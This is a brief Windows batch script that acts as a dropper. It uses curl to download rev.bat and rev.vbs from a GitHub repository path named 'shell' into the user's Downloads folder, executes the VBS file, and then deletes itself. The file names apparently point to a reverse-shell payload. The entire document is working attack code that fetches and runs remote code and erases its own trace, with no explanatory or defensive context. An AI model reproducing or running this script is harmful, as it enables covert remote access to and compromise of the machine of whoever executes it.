@echo off
curl https://raw.githubusercontent.com/0x2034/shell/main/rev.bat -o "%USERPROFILE%\Downloads\rev.bat"
curl https://raw.githubusercontent.com/0x2034/shell/main/rev.vbs -o "%USERPROFILE%\Downloads\rev.vbs"
call "%USERPROFILE%\Downloads\rev.vbs"
del "%~f0"

